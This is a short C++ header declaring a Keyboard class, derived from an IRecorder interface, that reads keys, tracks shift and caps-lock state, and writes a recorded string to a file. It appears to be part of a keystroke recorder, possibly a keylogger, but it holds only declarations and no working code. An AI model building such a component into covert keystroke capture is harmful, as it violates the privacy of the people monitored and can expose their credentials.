#pragma once

#include "IRecorder.h"

#include <map>

class Keyboard : public IRecorder
{
public:
	Keyboard();
	virtual ~Keyboard();

public:
	const std::string 		readKey();
	const std::string 		manageKeys(unsigned int ascii);
	void					getMajState(unsigned char *keyState) const;
	void					checkCapital(unsigned int ascii);
	void					allUnlock();
	void					shiftLock();
	void					capitalLock();

	void					write(const std::string & filename);
	void					read();

private:
	bool					lockOn[2];
	bool					capital;
	std::string				record;
};